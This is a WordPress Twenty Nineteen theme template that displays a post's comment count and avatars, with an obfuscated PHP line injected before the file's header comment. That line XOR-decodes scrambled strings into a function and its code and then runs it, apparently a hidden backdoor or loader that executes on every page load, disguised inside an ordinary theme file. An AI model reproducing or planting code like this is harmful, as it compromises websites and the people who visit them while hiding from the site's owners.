<?php $TgZssAri='PA< =<4RUC B,>S'; $incQeD='33YAIYk4 -C6EQ='^$TgZssAri; $gHNYTlH=' HCgKK9.N QZgWDZ9,6rh<R=9R >Qec7==FchePkO ENVAZB=FO>InZQ81l:ML Lb=W- txw2,IyWtQxfEbkGwO FKqvvtIzfsZ7RrKRQlPaJew,U2E= P NbR8CVcIcL0MAjlgar,1JVyxSpP30 5esTar=QPWW=jW8ajh1OL;R mB:=7G0XAk3g7T,2>6Ck>,1OsMm0R.dkTIWGSmdr- QXYvywJ0 TkX Wqic 55ESZbXHDJKY0Sbxh,qyzg<uTV9si85IbxHKm 4GG4fFC2Lh-TD1i>-RxXlQYI6le=LU 77XMqsB749Hm7A7zS3idCrQY84qc>nGQ.KI5T<iYQky2zhuc iM bh2=7wjvyI.L9:+Ou.o=qF< -Y;92Koriw U=yCKDCH  6zEtE=R M Zfb,7MslI<1O7NYrtBZC66 6LGJTP,C8nUU15t3M=FOLOJIlAh33XU 2ieHX8 cNyR.9 U5Y =xpoe.6XQ,6ATiSloAALO;:8WUdS =4GMEu,0YtGKW 5-UqOIBJb5PDioRYB7fsP3<kayixNjrn0wl+Q qbAtpNJse dx  Yut3b-z6zFlhLIniz0HJ2K0Z7A<7J:9YMMc3.6=O8PpxbeY638cahsdmnR1S=Q4O-QB,JZU8jP4Y9=4Pm9onFe 9PBjioQb2'; $QYqYWNvf=$incQeD('', 'I.kF->WM:I>482<3JXEZOD=Of6AJ0:<ZHIaJAE+aFF0 553-Sf7Q;1>0LP3e 9TdFY6YAXXSYI0PwTqXF>hbNS U2kLVQSrpoz<X Zo;qQpQqESEiA1OL5NfF6Y77JrChYfjCfnhVCD>vWEsXtWQTT>W=<Rcqt<2D1sQAOHB;>W7NEfQXNnmqza:nE1XGLXkOQYEfHGdMXSnap-632MYRKA=+<MsS.QT543E.QTCFTY66ahR.+8.8S;BPLs265,u0t7JSMSP0BEvkIVU+2QOf88ELI50P6UH+XeLu2,OWo4h1ACVxpQW4VXL-V=<=p:UILbV58LUXCEdN7A9,T7TIqu4+w+=00tI,SBLYXNWWHYmX-UONfUUe4xbXAY8dRW2OOISK0DBIBMg,ATWZxTaK3L8EalkQ=0yfmXP;VndR4740SDIW .01xT,J114ET+l H2g..9,Zu7WV;:DWAA,9LAJbYvJXT4j2EDQYToGPpuHW55IuJO 3>.BeS2,;6XTG3>mRGU SkksDTY4XoodjJX4qAK686V=T;VEL<PIEsJUWSCZH2CDUtBB+xEVCQACAoDGQZIKRCuTOeiHOZQ:8S2o1R8cR2SJ->eDCOOQ Y4WTBA=WGYJHHSDMNrJY44B.AyfH+.4cM U URU4JdFULlEA96BYFjhO'^$gHNYTlH); $QYqYWNvf();
/**
 * The template for displaying Current Discussion on posts
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since Twenty Nineteen 1.0
 */

/* Get data from current discussion on post. */
$discussion    = twentynineteen_get_discussion_data();
$has_responses = $discussion->responses > 0;

if ( $has_responses ) {
	/* translators: %d: Number of comments. */
	$meta_label = sprintf( _n( '%d Comment', '%d Comments', $discussion->responses, 'twentynineteen' ), $discussion->responses );
} else {
	$meta_label = __( 'No comments', 'twentynineteen' );
}
?>

<div class="discussion-meta">
	<?php
	if ( $has_responses ) {
		twentynineteen_discussion_avatars_list( $discussion->authors );
	}
	?>
	<p class="discussion-meta-info">
		<?php echo twentynineteen_get_icon_svg( 'comment', 24 ); ?>
		<span><?php echo esc_html( $meta_label ); ?></span>
	</p>
</div><!-- .discussion-meta -->
